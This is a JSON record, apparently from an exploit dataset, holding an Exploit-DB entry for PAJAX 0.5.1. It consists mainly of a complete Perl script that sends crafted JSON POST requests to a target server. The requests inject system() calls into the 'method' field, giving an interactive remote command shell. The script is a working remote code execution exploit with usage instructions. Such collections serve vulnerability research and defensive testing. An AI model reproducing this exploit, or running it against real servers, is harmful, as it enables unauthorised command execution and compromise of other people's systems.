{
  "id": "1672",
  "title": "PAJAX 0.5.1 - Remote Code Execution",
  "cve": null,
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\n\r\nuse IO::Socket;\r\n\r\nprint \"PAJAX Remote Code Injection - code by: Stoney - exploit found\r\nby: RedTeam\\n\";\r\n\r\nif ($ARGV[0] && $ARGV[1])\r\n{\r\n $host = $ARGV[0];\r\n $path = $ARGV[1];\r\n $sock = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => \"$host\",\r\nPeerPort => \"80\") || die \"connecterror\\n\";\r\n while (1) {\r\n   print '['.$host.']# ';\r\n   $cmd = <STDIN>;\r\n   chop($cmd);\r\n   last if ($cmd eq 'exit');\r\n   $ajaxdata = \"{\\\"id\\\": \\\"bb2238f1186dad8d6370d2bab5f290f71\\\", \\\"className\\\": \\\"Calculator\\\", \\\"method\\\": \\\"add(1,1);system($cmd);\\$obj->add\\\", \\\"params\\\": [\\\"1\\\", \\\"5\\\"]}\";\r\n\r\n   print $sock \"POST \".$path.\" HTTP/1.1\\n\";\r\n   print $sock \"Host: \".$host.\"\\n\";\r\n   print $sock \"Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\";\r\n   print $sock \"Content-Type: text/json\\n\";\r\n   print $sock \"Content-Length:\".length($ajaxdata).\"\\n\\n\".$ajaxdata;\r\n   while ($ans = <$sock>)\r\n      {\r\n       print \"$ans\";\r\n      }\r\n  }\r\n }\r\nelse {\r\n print \"Usage: perl ajax.pl [host] [path_to_ajax]\\n\\n\";\r\nexit;\r\n}\r\n\r\n# milw0rm.com [2006-04-13]",
  "url": "https://www.exploit-db.com/exploits/1672"
}